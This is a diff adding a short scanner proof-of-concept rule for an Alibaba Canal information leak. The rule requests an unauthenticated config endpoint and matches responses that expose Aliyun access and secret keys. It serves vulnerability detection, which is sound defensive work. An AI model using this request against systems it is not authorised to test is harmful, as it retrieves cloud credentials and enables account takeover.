@@ -1,0 +1,12 @@
+name: poc-yaml-alibaba-canal-info-leak
+rules:
+  - method: GET
+    path: /api/v1/canal/config/1/1
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"ncanal.aliyun.accessKey") && response.body.bcontains(b"ncanal.aliyun.secretKey")
+detail:
+  author: Aquilao(https://github.com/Aquilao)
+  info: alibaba Canal info leak
+  links:
+    - https://my.oschina.net/u/4581879/blog/4753320
